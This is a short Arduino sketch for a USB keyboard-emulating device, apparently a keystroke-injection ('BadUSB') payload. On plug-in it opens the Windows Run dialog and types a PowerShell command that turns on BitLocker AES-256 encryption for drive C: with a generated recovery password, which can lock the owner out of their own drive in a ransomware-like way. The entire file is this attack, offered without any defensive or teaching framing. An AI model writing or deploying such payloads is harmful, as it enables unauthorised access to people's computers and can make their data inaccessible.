#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell Enable-BitLocker -MountPoint \"C:\" -EncryptionMethod Aes256 -RecoveryPasswordProtector");
}

void loop() {}
